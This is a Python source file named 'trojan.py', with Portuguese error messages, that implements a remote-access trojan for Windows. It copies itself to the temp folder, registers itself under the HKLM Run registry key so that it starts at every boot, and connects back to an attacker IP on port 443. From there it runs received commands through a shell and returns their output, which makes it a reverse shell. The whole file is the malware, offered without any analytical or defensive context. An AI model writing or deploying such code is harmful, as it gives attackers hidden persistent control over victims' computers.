import socket
import os
import subprocess
import time
import tempfile

IP = ''
PORT = 443
FILENAME = 'trojan.py'
TEMPDIR = tempfile.gettempdir()

def autorun():
	print (TEMPDIR)
	try:
		os.system("copy " + FILENAME + " " + TEMPDIR)
	except:
		print ('Erro na copia')
		pass
	try:
		FNULL = open(os.devnull, 'w')
		subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" " /v Network /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
	except:
		print ('Erro de registro')
		pass

def connect(IP,PORT):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((IP,PORT))
		s.send('[ ! ] - Conexao Recebida')
		return s
	except Exception as e:
		print('Falha na conexao',e)
		return None

def listen(s):
	try:
		while True:
			data = s.recv(1024)
			if data[:-1] == '/exit':
				s.close()
				exit(0)
			else:
				cmd(s,data[:-1])
	except:
		print('Erro no cmd')
		error(s)

def cmd(s, data):
	try:
		proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		s.send(proc.stdout.read() + proc.stderr.read() + '\n')
	except:
		main()

def error(s):
	if s:
		s.close()
	main()

def main():
	while True:
		s = connect(IP,PORT)
		if s:
			listen(s)
		else:
			time.sleep(10)

autorun()